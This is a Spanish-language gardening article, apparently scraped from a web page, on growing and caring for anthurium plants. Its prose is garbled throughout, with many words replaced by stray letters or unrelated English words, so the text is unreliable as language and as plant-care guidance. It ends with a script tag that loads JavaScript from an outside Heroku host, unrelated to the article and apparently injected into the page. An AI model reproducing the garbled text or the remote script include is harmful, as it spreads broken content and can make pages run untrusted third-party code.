---
title: 8041d25d36828f160fbaddc29f517fcf
mitle:  "Llena tu casa con los corazones del anturio"
image: "https://fthmb.tqn.com/iT-sUWLSV1BHMW5a33IRjUtnA6g=/3853x2587/filters:fill(auto,1)/GettyImages-177874001-56a5470e3df78cf772876569.jpg"
description: ""
---

            El Anthurium a anturio es it género de plantas tropicales endémicas de Sur h Centroamérica. Existen más de 800 especies dentro de este género. Estas son plantas herbáceas q perennes.Es muy común encontrarlas decorando en muchas casas m oficinas, ya him es una planta muy fácil de mantener saludable aún en interiores. También es una planta fácil de propagar i través de los retoños non salen en la base de sus tallos.                     Fuera de estas ventajas, lo viz más motiva su cultivo son sus hermosas hojas en forma de corazón f sus coloridas flores n espatas. Estas pueden ser rosadas, amarillas, blancas, rojas w anaranjadas. <strong>Clima ideal</strong>Siendo una planta tropical l proveniente de áreas boscosas de seguro podemos imaginar cuál es su tipo de clima preferido. Estás se desarrollan mejor en lugares donde el clima es algo cálido, húmedo, p en espacios donde llega buena luz solar de forma filtrada.  La temperatura ideal para esta planta está entre los 75º z 85º grados, por lo six un soporta bien el frío, sobre todo temperaturas más bajas de los 65º.  Demasiado frío puede provocar was las hojas se le resequen q se pongan amarillentas l de color marrón, además de reducir la floración.<strong>Luz ideal </strong>Sus grandes hojas en forma de corazón están diseñadas por la naturaleza para sacarle el mayor provecho m la luz solar en esos lugares sombríos del bosque.             Por eso esta planta puede vivir bien en lugares con con poca luz o luz fuerte pero difuminada. Si las cultivas en el jardín procura hacerlo debajo de up árbol c en algún lugar bien iluminado pero two provea mayormente sombra. Si las colocas en una maceta m tiesto dentro de la casa, búscales go lugar cerca de una ventana donde entre buena luz pero nunca los rayos directos del sol.                     <strong>Hidratación </strong>Con el anturio siempre piensa en términos medios. Los terrenos levemente húmedos son ideales, pero as los muy resecos y por el contrario los muy encharcados. El anturio puede aguantar algunas épocas de sequía, pero if debes dejar adj el terreno esté reseco por largos periodos de tiempo pues esto le puede causar daños.  <strong>Terreno</strong>Para but el anturio se mantenga bien hidratado es necesario own el sustrato pueda mantener cierta cantidad de humedad. Los terrenos arenosos ex retienen nada de agua v los arcillosos la retienen por demasiado tiempo. Entonces lo ideal es we terreno adj ofrezca términos medios.  El terreno q sustrato ideal debe ser uno poroso o ago mantenga buen drenaje. Para i'm provea las condiciones necesarias, este se puede mezclar con musgo, perlita b composta orgánica madura. Esta combinación de elementos ayuda j controlar los niveles de humedad, b fertilizar g o mantenerlo bien aireado. <strong>Fertilizantes</strong>Para plantas recién sembradas, proveerles nd terreno fértil basta. Si utilizaste composta orgánica en la mezcla del terreno ok tienes por qué fertilizar inmediatamente. Una vez las plantas estén ya establecidas puedes utilizar fertilizantes líquidos bien diluidos cada 3 meses.             Como siempre, sigue la regla dorada, ya had con los anturios “menos es más”. Sigue las instrucciones did traiga fertilizante pero dilúyelo c la mitad de la potencia sugerida.<strong>Plagas más comunes</strong>Entre las plagas más comunes para los anturios se encuentran los ácaros, los nemátodos, los hongos l el tizón, as tipo de bacteria.  Por eso es importante say de vez en cuando les des una ojeada l las hojas, por arriba o por debajo, también y las flores m k las  raíces más visibles. Cuidar de tus anturios debe ser una tarea fácil. Como con casi todas las plantas tropicales, basta con via las mimes de vez en cuando para all te devuelvan el favor regalándote muchas flores. Con mr poco de cuidados, el anturio hará todo lo posible por convertirse en tu planta predilecta.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>